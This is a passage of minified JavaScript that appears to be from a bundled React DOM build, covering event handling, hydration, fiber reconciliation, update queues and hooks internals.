e;if((v||x)&&(x=h.window===h?h:(x=h.ownerDocument)?x.defaultView||x.parentWindow:window,v?(f=r.relatedTarget||r.toElement,v=u,f=f?ds(f):null,f!==null&&(j=ks(f),f!==j||f.tag!==5&&f.tag!==6)&&(f=null)):(v=null,f=u),v!==f)){if(w=Hu,k="onMouseLeave",y="onMouseEnter",m="mouse",(e==="pointerout"||e==="pointerover")&&(w=Gu,k="onPointerLeave",y="onPointerEnter",m="pointer"),j=v==null?x:Ms(v),g=f==null?x:Ms(f),x=new w(k,m+"leave",v,r,h),x.target=j,x.relatedTarget=g,k=null,ds(h)===u&&(w=new w(y,m+"enter",f,r,h),w.target=g,w.relatedTarget=j,k=w),j=k,v&&f)t:{for(w=v,y=f,m=0,g=w;g;g=Ns(g))m++;for(g=0,k=y;k;k=Ns(k))g++;for(;0<m-g;)w=Ns(w),m--;for(;0<g-m;)y=Ns(y),g--;for(;m--;){if(w===y||y!==null&&w===y.alternate)break t;w=Ns(w),y=Ns(y)}w=null}else w=null;v!==null&&ad(p,x,v,w,!1),f!==null&&j!==null&&ad(p,j,f,w,!0)}}e:{if(x=u?Ms(u):window,v=x.nodeName&&x.nodeName.toLowerCase(),v==="select"||v==="input"&&x.type==="file")var C=M0;else if(Qu(x))if(xf)C=V0;else{C=B0;var S=F0}else(v=x.nodeName)&&v.toLowerCase()==="input"&&(x.type==="checkbox"||x.type==="radio")&&(C=W0);if(C&&(C=C(e,u))){pf(p,C,r,h);break e}S&&S(e,x,u),e==="focusout"&&(S=x._wrapperState)&&S.controlled&&x.type==="number"&&yo(x,"number",x.value)}switch(S=u?Ms(u):window,e){case"focusin":(Qu(S)||S.contentEditable==="true")&&(Us=S,Ro=u,Wn=null);break;case"focusout":Wn=Ro=Us=null;break;case"mousedown":Po=!0;break;case"contextmenu":case"mouseup":case"dragend":Po=!1,rd(p,r,h);break;case"selectionchange":if(K0)break;case"keydown":case"keyup":rd(p,r,h)}var R;if(Mc)e:{switch(e){case"compositionstart":var T="onCompositionStart";break e;case"compositionend":T="onCompositionEnd";break e;case"compositionupdate":T="onCompositionUpdate";break e}T=void 0}else Ls?ff(e,r)&&(T="onCompositionEnd"):e==="keydown"&&r.keyCode===229&&(T="onCompositionStart");T&&(hf&&r.locale!=="ko"&&(Ls||T!=="onCompositionStart"?T==="onCompositionEnd"&&Ls&&(R=df()):(_r=h,Lc="value"in _r?_r.value:_r.textContent,Ls=!0)),S=yi(u,T),0<S.length&&(T=new Ku(T,e,null,r,h),p.push({event:T,listeners:S}),R?T.data=R:(R=mf(r),R!==null&&(T.data=R)))),(R=$0?z0(e,r):L0(e,r))&&(u=yi(u,"onBeforeInput"),0<u.length&&(h=new Ku("onBeforeInput","beforeinput",null,r,h),p.push({event:h,listeners:u}),h.data=R))}Sf(p,t)})}function aa(e,t,r){return{instance:e,listener:t,currentTarget:r}}function yi(e,t){for(var r=t+"Capture",s=[];e!==null;){var a=e,i=a.stateNode;a.tag===5&&i!==null&&(a=i,i=Xn(e,r),i!=null&&s.unshift(aa(e,i,a)),i=Xn(e,t),i!=null&&s.push(aa(e,i,a))),e=e.return}return s}function Ns(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function ad(e,t,r,s,a){for(var i=t._reactName,l=[];r!==null&&r!==s;){var o=r,c=o.alternate,u=o.stateNode;if(c!==null&&c===s)break;o.tag===5&&u!==null&&(o=u,a?(c=Xn(r,i),c!=null&&l.unshift(aa(r,c,o))):a||(c=Xn(r,i),c!=null&&l.push(aa(r,c,o)))),r=r.return}l.length!==0&&e.push({event:t,listeners:l})}var Q0=/\r\n?/g,X0=/\u0000|\uFFFD/g;function id(e){return(typeof e=="string"?e:""+e).replace(Q0,`
`).replace(X0,"")}function Ua(e,t,r){if(t=id(t),id(e)!==t&&r)throw Error(A(425))}function vi(){}var Ao=null,Oo=null;function Io(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var $o=typeof setTimeout=="function"?setTimeout:void 0,Z0=typeof clearTimeout=="function"?clearTimeout:void 0,ld=typeof Promise=="function"?Promise:void 0,ex=typeof queueMicrotask=="function"?queueMicrotask:typeof ld<"u"?function(e){return ld.resolve(null).then(e).catch(tx)}:$o;function tx(e){setTimeout(function(){throw e})}function Wl(e,t){var r=t,s=0;do{var a=r.nextSibling;if(e.removeChild(r),a&&a.nodeType===8)if(r=a.data,r==="/$"){if(s===0){e.removeChild(a),ta(t);return}s--}else r!=="$"&&r!=="$?"&&r!=="$!"||s++;r=a}while(r);ta(t)}function Pr(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function od(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var r=e.data;if(r==="$"||r==="$!"||r==="$?"){if(t===0)return e;t--}else r==="/$"&&t++}e=e.previousSibling}return null}var mn=Math.random().toString(36).slice(2),qt="__reactFiber$"+mn,ia="__reactProps$"+mn,cr="__reactContainer$"+mn,zo="__reactEvents$"+mn,rx="__reactListeners$"+mn,sx="__reactHandles$"+mn;function ds(e){var t=e[qt];if(t)return t;for(var r=e.parentNode;r;){if(t=r[cr]||r[qt]){if(r=t.alternate,t.child!==null||r!==null&&r.child!==null)for(e=od(e);e!==null;){if(r=e[qt])return r;e=od(e)}return t}e=r,r=e.parentNode}return null}function Na(e){return e=e[qt]||e[cr],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Ms(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(A(33))}function Gi(e){return e[ia]||null}var Lo=[],Fs=-1;function Br(e){return{current:e}}function xe(e){0>Fs||(e.current=Lo[Fs],Lo[Fs]=null,Fs--)}function he(e,t){Fs++,Lo[Fs]=e.current,e.current=t}var Dr={},Ke=Br(Dr),nt=Br(!1),gs=Dr;function rn(e,t){var r=e.type.contextTypes;if(!r)return Dr;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===t)return s.__reactInternalMemoizedMaskedChildContext;var a={},i;for(i in r)a[i]=t[i];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=a),a}function at(e){return e=e.childContextTypes,e!=null}function wi(){xe(nt),xe(Ke)}function cd(e,t,r){if(Ke.current!==Dr)throw Error(A(168));he(Ke,t),he(nt,r)}function Cf(e,t,r){var s=e.stateNode;if(t=t.childContextTypes,typeof s.getChildContext!="function")return r;s=s.getChildContext();for(var a in s)if(!(a in t))throw Error(A(108,Fp(e)||"Unknown",a));return je({},r,s)}function bi(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Dr,gs=Ke.current,he(Ke,e),he(nt,nt.current),!0}function ud(e,t,r){var s=e.stateNode;if(!s)throw Error(A(169));r?(e=Cf(e,t,gs),s.__reactInternalMemoizedMergedChildContext=e,xe(nt),xe(Ke),he(Ke,e)):xe(nt),he(nt,r)}var rr=null,Ji=!1,Vl=!1;function Tf(e){rr===null?rr=[e]:rr.push(e)}function nx(e){Ji=!0,Tf(e)}function Wr(){if(!Vl&&rr!==null){Vl=!0;var e=0,t=ae;try{var r=rr;for(ae=1;e<r.length;e++){var s=r[e];do s=s(!0);while(s!==null)}rr=null,Ji=!1}catch(a){throw rr!==null&&(rr=rr.slice(e+1)),Zh(Oc,Wr),a}finally{ae=t,Vl=!1}}return null}var Bs=[],Ws=0,ji=null,ki=0,vt=[],wt=0,ys=null,sr=1,nr="";function is(e,t){Bs[Ws++]=ki,Bs[Ws++]=ji,ji=e,ki=t}function Rf(e,t,r){vt[wt++]=sr,vt[wt++]=nr,vt[wt++]=ys,ys=e;var s=sr;e=nr;var a=32-Dt(s)-1;s&=~(1<<a),r+=1;var i=32-Dt(t)+a;if(30<i){var l=a-a%5;i=(s&(1<<l)-1).toString(32),s>>=l,a-=l,sr=1<<32-Dt(t)+a|r<<a|s,nr=i+e}else sr=1<<i|r<<a|s,nr=e}function Bc(e){e.return!==null&&(is(e,1),Rf(e,1,0))}function Wc(e){for(;e===ji;)ji=Bs[--Ws],Bs[Ws]=null,ki=Bs[--Ws],Bs[Ws]=null;for(;e===ys;)ys=vt[--wt],vt[wt]=null,nr=vt[--wt],vt[wt]=null,sr=vt[--wt],vt[wt]=null}var mt=null,ht=null,ge=!1,Lt=null;function Pf(e,t){var r=jt(5,null,null,0);r.elementType="DELETED",r.stateNode=t,r.return=e,t=e.deletions,t===null?(e.deletions=[r],e.flags|=16):t.push(r)}function dd(e,t){switch(e.tag){case 5:var r=e.type;return t=t.nodeType!==1||r.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,mt=e,ht=Pr(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,mt=e,ht=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(r=ys!==null?{id:sr,overflow:nr}:null,e.memoizedState={dehydrated:t,treeContext:r,retryLane:1073741824},r=jt(18,null,null,0),r.stateNode=t,r.return=e,e.child=r,mt=e,ht=null,!0):!1;default:return!1}}function Uo(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Do(e){if(ge){var t=ht;if(t){var r=t;if(!dd(e,t)){if(Uo(e))throw Error(A(418));t=Pr(r.nextSibling);var s=mt;t&&dd(e,t)?Pf(s,r):(e.flags=e.flags&-4097|2,ge=!1,mt=e)}}else{if(Uo(e))throw Error(A(418));e.flags=e.flags&-4097|2,ge=!1,mt=e}}}function hd(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;mt=e}function Da(e){if(e!==mt)return!1;if(!ge)return hd(e),ge=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!Io(e.type,e.memoizedProps)),t&&(t=ht)){if(Uo(e))throw Af(),Error(A(418));for(;t;)Pf(e,t),t=Pr(t.nextSibling)}if(hd(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(A(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var r=e.data;if(r==="/$"){if(t===0){ht=Pr(e.nextSibling);break e}t--}else r!=="$"&&r!=="$!"&&r!=="$?"||t++}e=e.nextSibling}ht=null}}else ht=mt?Pr(e.stateNode.nextSibling):null;return!0}function Af(){for(var e=ht;e;)e=Pr(e.nextSibling)}function sn(){ht=mt=null,ge=!1}function Vc(e){Lt===null?Lt=[e]:Lt.push(e)}var ax=fr.ReactCurrentBatchConfig;function Rn(e,t,r){if(e=r.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(r._owner){if(r=r._owner,r){if(r.tag!==1)throw Error(A(309));var s=r.stateNode}if(!s)throw Error(A(147,e));var a=s,i=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===i?t.ref:(t=function(l){var o=a.refs;l===null?delete o[i]:o[i]=l},t._stringRef=i,t)}if(typeof e!="string")throw Error(A(284));if(!r._owner)throw Error(A(290,e))}return e}function Ma(e,t){throw e=Object.prototype.toString.call(t),Error(A(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function fd(e){var t=e._init;return t(e._payload)}function Of(e){function t(y,m){if(e){var g=y.deletions;g===null?(y.deletions=[m],y.flags|=16):g.push(m)}}function r(y,m){if(!e)return null;for(;m!==null;)t(y,m),m=m.sibling;return null}function s(y,m){for(y=new Map;m!==null;)m.key!==null?y.set(m.key,m):y.set(m.index,m),m=m.sibling;return y}function a(y,m){return y=$r(y,m),y.index=0,y.sibling=null,y}function i(y,m,g){return y.index=g,e?(g=y.alternate,g!==null?(g=g.index,g<m?(y.flags|=2,m):g):(y.flags|=2,m)):(y.flags|=1048576,m)}function l(y){return e&&y.alternate===null&&(y.flags|=2),y}function o(y,m,g,k){return m===null||m.tag!==6?(m=Ql(g,y.mode,k),m.return=y,m):(m=a(m,g),m.return=y,m)}function c(y,m,g,k){var C=g.type;return C===zs?h(y,m,g.props.children,k,g.key):m!==null&&(m.elementType===C||typeof C=="object"&&C!==null&&C.$$typeof===yr&&fd(C)===m.type)?(k=a(m,g.props),k.ref=Rn(y,m,g),k.return=y,k):(k=ci(g.type,g.key,g.props,null,y.mode,k),k.ref=Rn(y,m,g),k.return=y,k)}function u(y,m,g,k){return m===null||m.tag!==4||m.stateNode.containerInfo!==g.containerInfo||m.stateNode.implementation!==g.implementation?(m=Xl(g,y.mode,k),m.return=y,m):(m=a(m,g.children||[]),m.return=y,m)}function h(y,m,g,k,C){return m===null||m.tag!==7?(m=xs(g,y.mode,k,C),m.return=y,m):(m=a(m,g),m.return=y,m)}function p(y,m,g){if(typeof m=="string"&&m!==""||typeof m=="number")return m=Ql(""+m,y.mode,g),m.return=y,m;if(typeof m=="object"&&m!==null){switch(m.$$typeof){case Ta:return g=ci(m.type,m.key,m.props,null,y.mode,g),g.ref=Rn(y,null,m),g.return=y,g;case $s:return m=Xl(m,y.mode,g),m.return=y,m;case yr:var k=m._init;return p(y,k(m._payload),g)}if($n(m)||Nn(m))return m=xs(m,y.mode,g,null),m.return=y,m;Ma(y,m)}return null}function x(y,m,g,k){var C=m!==null?m.key:null;if(typeof g=="string"&&g!==""||typeof g=="number")return C!==null?null:o(y,m,""+g,k);if(typeof g=="object"&&g!==null){switch(g.$$typeof){case Ta:return g.key===C?c(y,m,g,k):null;case $s:return g.key===C?u(y,m,g,k):null;case yr:return C=g._init,x(y,m,C(g._payload),k)}if($n(g)||Nn(g))return C!==null?null:h(y,m,g,k,null);Ma(y,g)}return null}function v(y,m,g,k,C){if(typeof k=="string"&&k!==""||typeof k=="number")return y=y.get(g)||null,o(m,y,""+k,C);if(typeof k=="object"&&k!==null){switch(k.$$typeof){case Ta:return y=y.get(k.key===null?g:k.key)||null,c(m,y,k,C);case $s:return y=y.get(k.key===null?g:k.key)||null,u(m,y,k,C);case yr:var S=k._init;return v(y,m,g,S(k._payload),C)}if($n(k)||Nn(k))return y=y.get(g)||null,h(m,y,k,C,null);Ma(m,k)}return null}function f(y,m,g,k){for(var C=null,S=null,R=m,T=m=0,L=null;R!==null&&T<g.length;T++){R.index>T?(L=R,R=null):L=R.sibling;var $=x(y,R,g[T],k);if($===null){R===null&&(R=L);break}e&&R&&$.alternate===null&&t(y,R),m=i($,m,T),S===null?C=$:S.sibling=$,S=$,R=L}if(T===g.length)return r(y,R),ge&&is(y,T),C;if(R===null){for(;T<g.length;T++)R=p(y,g[T],k),R!==null&&(m=i(R,m,T),S===null?C=R:S.sibling=R,S=R);return ge&&is(y,T),C}for(R=s(y,R);T<g.length;T++)L=v(R,y,T,g[T],k),L!==null&&(e&&L.alternate!==null&&R.delete(L.key===null?T:L.key),m=i(L,m,T),S===null?C=L:S.sibling=L,S=L);return e&&R.forEach(function(G){return t(y,G)}),ge&&is(y,T),C}function w(y,m,g,k){var C=Nn(g);if(typeof C!="function")throw Error(A(150));if(g=C.call(g),g==null)throw Error(A(151));for(var S=C=null,R=m,T=m=0,L=null,$=g.next();R!==null&&!$.done;T++,$=g.next()){R.index>T?(L=R,R=null):L=R.sibling;var G=x(y,R,$.value,k);if(G===null){R===null&&(R=L);break}e&&R&&G.alternate===null&&t(y,R),m=i(G,m,T),S===null?C=G:S.sibling=G,S=G,R=L}if($.done)return r(y,R),ge&&is(y,T),C;if(R===null){for(;!$.done;T++,$=g.next())$=p(y,$.value,k),$!==null&&(m=i($,m,T),S===null?C=$:S.sibling=$,S=$);return ge&&is(y,T),C}for(R=s(y,R);!$.done;T++,$=g.next())$=v(R,y,T,$.value,k),$!==null&&(e&&$.alternate!==null&&R.delete($.key===null?T:$.key),m=i($,m,T),S===null?C=$:S.sibling=$,S=$);return e&&R.forEach(function(fe){return t(y,fe)}),ge&&is(y,T),C}function j(y,m,g,k){if(typeof g=="object"&&g!==null&&g.type===zs&&g.key===null&&(g=g.props.children),typeof g=="object"&&g!==null){switch(g.$$typeof){case Ta:e:{for(var C=g.key,S=m;S!==null;){if(S.key===C){if(C=g.type,C===zs){if(S.tag===7){r(y,S.sibling),m=a(S,g.props.children),m.return=y,y=m;break e}}else if(S.elementType===C||typeof C=="object"&&C!==null&&C.$$typeof===yr&&fd(C)===S.type){r(y,S.sibling),m=a(S,g.props),m.ref=Rn(y,S,g),m.return=y,y=m;break e}r(y,S);break}else t(y,S);S=S.sibling}g.type===zs?(m=xs(g.props.children,y.mode,k,g.key),m.return=y,y=m):(k=ci(g.type,g.key,g.props,null,y.mode,k),k.ref=Rn(y,m,g),k.return=y,y=k)}return l(y);case $s:e:{for(S=g.key;m!==null;){if(m.key===S)if(m.tag===4&&m.stateNode.containerInfo===g.containerInfo&&m.stateNode.implementation===g.implementation){r(y,m.sibling),m=a(m,g.children||[]),m.return=y,y=m;break e}else{r(y,m);break}else t(y,m);m=m.sibling}m=Xl(g,y.mode,k),m.return=y,y=m}return l(y);case yr:return S=g._init,j(y,m,S(g._payload),k)}if($n(g))return f(y,m,g,k);if(Nn(g))return w(y,m,g,k);Ma(y,g)}return typeof g=="string"&&g!==""||typeof g=="number"?(g=""+g,m!==null&&m.tag===6?(r(y,m.sibling),m=a(m,g),m.return=y,y=m):(r(y,m),m=Ql(g,y.mode,k),m.return=y,y=m),l(y)):r(y,m)}return j}var nn=Of(!0),If=Of(!1),_i=Br(null),Ni=null,Vs=null,qc=null;function Hc(){qc=Vs=Ni=null}function Kc(e){var t=_i.current;xe(_i),e._currentValue=t}function Mo(e,t,r){for(;e!==null;){var s=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,s!==null&&(s.childLanes|=t)):s!==null&&(s.childLanes&t)!==t&&(s.childLanes|=t),e===r)break;e=e.return}}function Xs(e,t){Ni=e,qc=Vs=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&t&&(st=!0),e.firstContext=null)}function _t(e){var t=e._currentValue;if(qc!==e)if(e={context:e,memoizedValue:t,next:null},Vs===null){if(Ni===null)throw Error(A(308));Vs=e,Ni.dependencies={lanes:0,firstContext:e}}else Vs=Vs.next=e;return t}var hs=null;function Gc(e){hs===null?hs=[e]:hs.push(e)}function $f(e,t,r,s){var a=t.interleaved;return a===null?(r.next=r,Gc(t)):(r.next=a.next,a.next=r),t.interleaved=r,ur(e,s)}function ur(e,t){e.lanes|=t;var r=e.alternate;for(r!==null&&(r.lanes|=t),r=e,e=e.return;e!==null;)e.childLanes|=t,r=e.alternate,r!==null&&(r.childLanes|=t),r=e,e=e.return;return r.tag===3?r.stateNode:null}var vr=!1;function Jc(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function zf(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function ar(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function Ar(e,t,r){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,ee&2){var a=s.pending;return a===null?t.next=t:(t.next=a.next,a.next=t),s.pending=t,ur(e,r)}return a=s.interleaved,a===null?(t.next=t,Gc(s)):(t.next=a.next,a.next=t),s.interleaved=t,ur(e,r)}function si(e,t,r){if(t=t.updateQueue,t!==null&&(t=t.shared,(r&4194240)!==0)){var s=t.lanes;s&=e.pendingLanes,r|=s,t.lanes=r,Ic(e,r)}}function md(e,t){var r=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,r===s)){var a=null,i=null;if(r=r.firstBaseUpdate,r!==null){do{var l={eventTime:r.eventTime,lane:r.lane,tag:r.tag,payload:r.payload,callback:r.callback,next:null};i===null?a=i=l:i=i.next=l,r=r.next}while(r!==null);i===null?a=i=t:i=i.next=t}else a=i=t;r={baseState:s.baseState,firstBaseUpdate:a,lastBaseUpdate:i,shared:s.shared,effects:s.effects},e.updateQueue=r;return}e=r.lastBaseUpdate,e===null?r.firstBaseUpdate=t:e.next=t,r.lastBaseUpdate=t}function Si(e,t,r,s){var a=e.updateQueue;vr=!1;var i=a.firstBaseUpdate,l=a.lastBaseUpdate,o=a.shared.pending;if(o!==null){a.shared.pending=null;var c=o,u=c.next;c.next=null,l===null?i=u:l.next=u,l=c;var h=e.alternate;h!==null&&(h=h.updateQueue,o=h.lastBaseUpdate,o!==l&&(o===null?h.firstBaseUpdate=u:o.next=u,h.lastBaseUpdate=c))}if(i!==null){var p=a.baseState;l=0,h=u=c=null,o=i;do{var x=o.lane,v=o.eventTime;if((s&x)===x){h!==null&&(h=h.next={eventTime:v,lane:0,tag:o.tag,payload:o.payload,callback:o.callback,next:null});e:{var f=e,w=o;switch(x=t,v=r,w.tag){case 1:if(f=w.payload,typeof f=="function"){p=f.call(v,p,x);break e}p=f;break e;case 3:f.flags=f.flags&-65537|128;case 0:if(f=w.payload,x=typeof f=="function"?f.call(v,p,x):f,x==null)break e;p=je({},p,x);break e;case 2:vr=!0}}o.callback!==null&&o.lane!==0&&(e.flags|=64,x=a.effects,x===null?a.effects=[o]:x.push(o))}else v={eventTime:v,lane:x,tag:o.tag,payload:o.payload,callback:o.callback,next:null},h===null?(u=h=v,c=p):h=h.next=v,l|=x;if(o=o.next,o===null){if(o=a.shared.pending,o===null)break;x=o,o=x.next,x.next=null,a.lastBaseUpdate=x,a.shared.pending=null}}while(!0);if(h===null&&(c=p),a.baseState=c,a.firstBaseUpdate=u,a.lastBaseUpdate=h,t=a.shared.interleaved,t!==null){a=t;do l|=a.lane,a=a.next;while(a!==t)}else i===null&&(a.shared.lanes=0);ws|=l,e.lanes=l,e.memoizedState=p}}function pd(e,t,r){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var s=e[t],a=s.callback;if(a!==null){if(s.callback=null,s=r,typeof a!="function")throw Error(A(191,a));a.call(s)}}}var Sa={},Gt=Br(Sa),la=Br(Sa),oa=Br(Sa);function fs(e){if(e===Sa)throw Error(A(174));return e}function Yc(e,t){switch(he(oa,t),he(la,e),he(Gt,Sa),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:wo(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=wo(t,e)}xe(Gt),he(Gt,t)}function an(){xe(Gt),xe(la),xe(oa)}function Lf(e){fs(oa.current);var t=fs(Gt.current),r=wo(t,e.type);t!==r&&(he(la,e),he(Gt,r))}function Qc(e){la.current===e&&(xe(Gt),xe(la))}var ve=Br(0);function Ei(e){for(var t=e;t!==null;){if(t.tag===13){var r=t.memoizedState;if(r!==null&&(r=r.dehydrated,r===null||r.data==="$?"||r.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if(t.flags&128)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var ql=[];function Xc(){for(var e=0;e<ql.length;e++)ql[e]._workInProgressVersionPrimary=null;ql.length=0}var ni=fr.ReactCurrentDispatcher,Hl=fr.ReactCurrentBatchConfig,vs=0,we=null,Ae=null,Ie=null,Ci=!1,Vn=!1,ca=0,ix=0;function Ve(){throw Error(A(321))}function Zc(e,t){if(t===null)return!1;for(var r=0;r<t.length&&r<e.length;r++)if(!Ft(e[r],t[r]))return!1;return!0}function eu(e,t,r,s,a,i){if(vs=i,we=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,ni.current=e===null||e.memoizedState===null?ux:dx,e=r(s,a),Vn){i=0;do{if(Vn=!1,ca=0,25<=i)throw Error(A(301));i+=1,Ie=Ae=null,t.updateQueue=null,ni.current=hx,e=r(s,a)}while(Vn)}if(ni.current=Ti,t=Ae!==null&&Ae.next!==null,vs=0,Ie=Ae=we=null,Ci=!1,t)throw Error(A(300));return e}function tu(){var e=ca!==0;return ca=0,e}function Vt(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Ie===null?we.memoizedState=Ie=e:Ie=Ie.next=e,Ie}function Nt(){if(Ae===null){var e=we.alternate;e=e!==null?e.memoizedState:null}else e=Ae.next;var t=Ie===null?we.memoizedState:Ie.next;if(t!==null)Ie=t,Ae=e;else{if(e===null)throw Error(A(310));Ae=e,e={memoizedState:Ae.memoizedState,baseState:Ae.baseState,baseQueue:Ae.baseQueue,queue:Ae.queue,next:null},Ie===null?we.memoizedState=Ie=e:Ie=Ie.next=e}return Ie}function ua(e,t){return typeof t=="function"?t(e):t}function Kl(e){var t=Nt(),r=t.queue;if(r===null)throw Error(A(311));r.lastRenderedReducer=e;var s=Ae,a=s.baseQueue,i=r.pending;if(i!==null){if(a!==null){var l=a.next;a.next=i.next,i.next=l}s.baseQueue=a=i,r.pending=null}if(a!==null){i=a.next,s=s.baseState;var o=l=null,c=null,u=i;do{var h=u.lane;if((vs&h)===h)c!==null&&(c=c.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),s=u.hasEagerState?u.eagerState:e(s,u.action);else{var p={lane:h,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};c===null?(o=c=p,l=s):c=c.next=p,we.lanes|=h,ws|=h}u=u.next}while(u!==null&&u!==i);c===null?l=s:c.next=o,Ft(s,t.memoizedState)||(st=!0),t.memoizedState=s,t.baseState=l,t.baseQueue=c,r.lastRenderedState=s}if(e=r.interleaved,e!==null){a=e;do i=a.lane,we.lanes|=i,ws|=i,a=a.next;while(a!==e)}else a===null&&(r.lanes=0);return[t.memoizedState,r.dispatch]}function Gl(e){var t=Nt(),r=t.queue;if(r===null)throw Error(A(311));r.lastRenderedReducer=e;var s=r.dispatch,a=r.pending,i=t.memoizedState;if(a!==null){r.pending=null;var l=a=a.next;do i=e(i,l.action),l=l.next;while(l!==a);Ft(i,t.memoizedState)||(st=!0),t.memoizedState=i,t.baseQueue===null&&(t.baseState=i),r.lastRenderedState=i}return[i,s]}function Uf(){}function Df(e,t){var r=we,s=Nt(),a=t(),i=!Ft(s.memoizedState,a);if(i&&(s.memoizedState=a,st=!0),s=s.queue,ru(Bf.bind(null,r,s,e),[e]),s.getSnapshot!==t||i||Ie!==null&&Ie.memoizedState.tag&1){if(r.flags|=2048,da(9,Ff.bind(null,r,s,a,t),void 0,null),$e===null)throw Error(A(349));vs&30||Mf(r,t,a)}return a}function Mf(e,t,r){e.flags|=16384,e={getSnapshot:t,value:r},t=we.updateQueue,t===null?(t={lastEffect:null,stores:null},we.updateQueue=t,t.stores=[e]):(r=t.stores,r===null?t.stores=[e]:r.push(e))}function Ff(e,t,r,s){t.value=r,t.getSnapshot=s,Wf(t)&&Vf(e)}function Bf(e,t,r){return r(function(){Wf(t)&&Vf(e)})}function Wf(e){var t=e.getSnapshot;e=e.value;try{var r=t();return!Ft(e,r)}catch{return!0}}function Vf(e){var t=ur(e,1);t!==null&&Mt(t,e,1,-1)}function xd(e){var t=Vt();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:ua,lastRenderedState:e},t.queue=e,e=e.dispatch=cx.bind(null,we,e),[t.memoizedState,e]}function da(e,t,r,s){return e={tag:e,create:t,destroy:r,deps:s,next:null},t=we.updateQueue,t===null?(t={lastEffect:null,stores:null},we.updateQueue=t,t.lastEffect=e.next=e):(r=t.lastEffect,r===null?t.lastEffect=e.next=e:(s=r.next,r.next=e,e.next=s,t.lastEffect=e)),e}function qf(){return Nt().memoizedState}function ai(e,t,r,s){var a=Vt();we.flags|=e,a.memoizedState=da(1|t,r,void 0,s===void 0?null:s)}function Yi(e,t,r,s){var a=Nt();s=s===void 0?null:s;var i=void 0;if(Ae!==null){var l=Ae.memoizedState;if(i=l.destroy,s!==null&&Zc(s,l.deps)){a.memoizedState=da(t,r,i,s);return}}we.flags|=e,a.memoizedState=da(1|t,r,i,s)}function gd(e,t){return ai(8390656,8,e,t)}function ru(e,t){return Yi(2048,8,e,t)}function Hf(e,t){return Yi(4,2,e,t)}function Kf(e,t){return Yi(4,4,e,t)}function Gf(e,t){if(typeof t=="function")return e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function Jf(e,t,r){return r=r!=null?r.concat([e]):null,Yi(4,4,Gf.bind(null,t,e),r)}function su(){}function Yf(e,t){var r=Nt();t=t===void 0?null:t;var s=r.memoizedState;return s!==null&&t!==null&&Zc(t,s[1])?s[0]:(r.memoizedState=[e,t],e)}function Qf(e,t){var r=Nt();t=t===void 0?null:t;var s=r.memoizedState;return s!==null&&t!==null&&Zc(t,s[1])?s[0]:(e=e(),r.memoizedState=[e,t],e)}function Xf(e,t,r){return vs&21?(Ft(r,t)||(r=rf(),we.lanes|=r,ws|=r,e.baseState=!0),t):(e.baseState&&(e.baseState=!1,st=!0),e.memoizedState=r)}function lx(e,t){var r=ae;ae=r!==0&&4>r?r:4,e(!0);var s=Hl.transition;Hl.transition={};try{e(!1),t()}finally{ae=r,Hl.transition=s}}function Zf(){return Nt().memoizedState}function ox(e,t,r){var s=Ir(e);if(r={lane:s,action:r,hasEagerState:!1,eagerState:null,next:null},em(e))tm(t,r);else if(r=$f(e,t,r,s),r!==null){var a=Xe();Mt(r,e,s,a),rm(r,t,s)}}function cx(e,t,r){var 